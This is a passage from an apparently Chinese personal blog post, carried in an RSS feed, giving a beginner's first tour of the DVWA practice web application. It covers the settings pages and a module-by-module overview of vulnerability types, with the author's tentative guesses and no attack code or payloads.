&lt;p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.&lt;/p>
&lt;/blockquote>
&lt;p>用户自己决定怎么玩这个靶场，没有固定目标。可以先把一个模块从低难度到高难度全打通再继续下一个，也可以低难度把所有模块打通再提高难度再来一轮。&lt;/p>
&lt;blockquote>
&lt;p>Please note, there are &lt;em>both documented and undocumented vulnerability&lt;/em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.&lt;/p>
&lt;/blockquote>
&lt;p>并且还提到有意存在未文档化的漏洞，也就是攻破一个模块的方法并不局限于帮助文档里的方法，完全可能自己挖掘出别的问题。&lt;/p>
&lt;blockquote>
&lt;p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 还包含了 WAF，可以自己开启或者关闭。开启等于是给自己提高了难度。&lt;/p>
&lt;h3 id="php-info">PHP info&lt;/h3>
&lt;p>侧边栏下方有个 PHP Info 链接，点开看一眼，就是个经典的 phpinfo 页。&lt;/p>
&lt;p>php 版本是 7.0.30-0+deb9u1，应该是 debian 打包的版本。&lt;/p>
&lt;p>Apache 版本 2.4.25，Debian 打包的版本。&lt;/p>
&lt;p>其他半懂不懂的全部略，就当没看见。&lt;/p>
&lt;p>之后有需要再来看。&lt;/p>
&lt;h3 id="关于">关于&lt;/h3>
&lt;p>在 About 页里提到发行时间是 2015-10-08，确实很老了。&lt;/p>
&lt;p>里面还有些相关链接和资源、文档，把 dvwa 的官网主页加入收藏夹后剩下的内容暂且不管。&lt;/p>
&lt;h3 id="dvwa-security">DVWA security&lt;/h3>
&lt;p>安全配置页，显示当前的 DVWA 运行在哪个安全级别（就是前文介绍中提到的 &lt;strong>难度&lt;/strong>）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935.png"
width="904"
height="879"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421154901935"
class="gallery-image"
data-flex-grow="102"
data-flex-basis="246px"
>&lt;/p>
&lt;p>注意到页面这几个位置都有标注当前安全配置，在这个页面可以修改安全级别和 WAF （图中 PHPIDS）的开启状态。&lt;/p>
&lt;h3 id="setupreset-db">Setup/Reset DB&lt;/h3>
&lt;p>这个页面就是最初启动 DVWA 的时候初始化数据库的页面，可以在这个页面里重置数据库，也能在这个页面看到一些自检信息。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454.png"
width="896"
height="918"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155109454"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="234px"
>&lt;/p>
&lt;p>&lt;code>allow_url_include&lt;/code>暂时不管，等玩到那个模块的时候再看情况。&lt;/p>
&lt;p>&lt;code>reCAPTCHA key&lt;/code> 是验证码模块需要的，等玩到的时候再找下怎么配。&lt;/p>
&lt;p>最下面的 &lt;code>Create / Reset Database&lt;/code> 的按钮就是重置数据库了。对于用 &lt;code>docker --rm&lt;/code> 启动的我来说直接重启下容器清理地更干净，预计不会怎么用到这个功能。&lt;/p>
&lt;h3 id="模块速览">模块速览&lt;/h3>
&lt;h4 id="brute-force">Brute Force&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710.png"
width="909"
height="340"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155923710"
class="gallery-image"
data-flex-grow="267"
data-flex-basis="641px"
>&lt;/p>
&lt;p>一般说 Brute Force 的时候就是暴力破解了，”跑字典“啊什么的。遍历可能存在的的弱密码。&lt;/p>
&lt;h4 id="command-injection">Command Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139.png"
width="896"
height="266"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160341139"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>命令注入，相当经典的一个 ping，应该看一眼就知道指的什么了。&lt;/p>
&lt;h4 id="csrf">CSRF&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952.png"
width="905"
height="363"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160436952"
class="gallery-image"
data-flex-grow="249"
data-flex-basis="598px"
>&lt;/p>
&lt;p>跨站请求伪造，有点摸不着头脑。emm，难道是说这个页面没有考虑 csrf （可能还有cors？），所以能在别的站直接发个 xhr 实现修改密码？&lt;/p>
&lt;h4 id="file-inclusion">File Inclusion&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753.png"
width="912"
height="321"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160749753"
class="gallery-image"
data-flex-grow="284"
data-flex-basis="681px"
>&lt;/p>
&lt;p>没思路。虽然看过 p 大博客信手拈来的文件包含利用，但对着这个页面暂时还是想不出要干啥。&lt;/p>
&lt;blockquote>
&lt;p>PS：刚发现地址栏有点意思&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316.png"
width="337"
height="33"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160947316"
class="gallery-image"
data-flex-grow="1021"
data-flex-basis="2450px"
>&lt;/p>
&lt;/blockquote>
&lt;h4 id="file-upload">File Upload&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745.png"
width="895"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161006745"
class="gallery-image"
data-flex-grow="304"
data-flex-basis="730px"
>&lt;/p>
&lt;p>可能是任意文件上传相关的洞？&lt;/p>
&lt;h4 id="insecure-captcha">Insecure CAPTCHA&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749.png"
width="911"
height="306"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161050749"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="714px"
>&lt;/p>
&lt;p>看标题还是有点意思的，不安全的验证码指的是可以绕过验证码么？&lt;/p>
&lt;h4 id="sql-injection">SQL Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372.png"
width="909"
height="341"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161127372"
class="gallery-image"
data-flex-grow="266"
data-flex-basis="639px"
>&lt;/p>
&lt;p>经典SQL注入。&lt;/p>
&lt;h4 id="sql-injection-blind">SQL Injection (Blind)&lt;/h4>
&lt;p>和上面一样，不过是盲注。&lt;/p>
&lt;h4 id="weak-session-ids">Weak Session IDs&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944.png"
width="912"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161207944"
class="gallery-image"
data-flex-grow="252"
data-flex-basis="606px"
>&lt;/p>
&lt;p>对 PHP 还不够了解，不知道 &lt;code>Weak Session IDs&lt;/code> 指的是什么。可能和 Cookie 里的 &lt;code>PHPSESSID&lt;/code> 有关系？&lt;/p>
&lt;h4 id="xss-dom">XSS (DOM)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssreflected">XSS(Reflected)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssstored">XSS(Stored)&lt;/h4>
&lt;p>三类 XSS ，页面分别如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348.png"
width="680"
height="276"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(DOM)"
class="gallery-image"
data-flex-grow="246"
data-flex-basis="591px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360.png"
width="685"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(reflected)"
class="gallery-image"
data-flex-grow="256"
data-flex-basis="615px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946.png"
width="679"
height="393"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(Stored)"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="414px"
>&lt;/p>
&lt;p>除了 DOM 型看页面没有思路，另外两个看注入点还是清楚的。&lt;/p>
&lt;h4 id="csp-bypass">CSP Bypass&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897.png"
width="701"
height="290"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161626897"
class="gallery-image"
data-flex-grow="241"
data-flex-basis="580px"
>&lt;/p>
&lt;p>不了解 CSP，没头绪。&lt;/p>
&lt;h4 id="javascript">JavaScript&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960.png"
width="679"
height="280"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161759960"
class="gallery-image"
data-flex-grow="242"
data-flex-basis="582px"
>&lt;/p>
&lt;p>有点摸不着头脑，指的是在前端用 JS 检查表单不安全？&lt;/p>
&lt;p>看链接里的 &lt;code>es6-proxies-in-depth&lt;/code> 感觉是个绕过前端保护的题。&lt;/p>
&lt;h2 id="初体验总结">初体验总结&lt;/h2>
&lt;p>姑且算是把 DVWA 这个靶场在手里把玩了一下，初步看了看怎么玩、有什么可玩。&lt;/p>
&lt;p>接下来考虑是一题一题难度从低到高慢慢刷过去，实在干不过再跳。&lt;/p></description></item></channel></rss>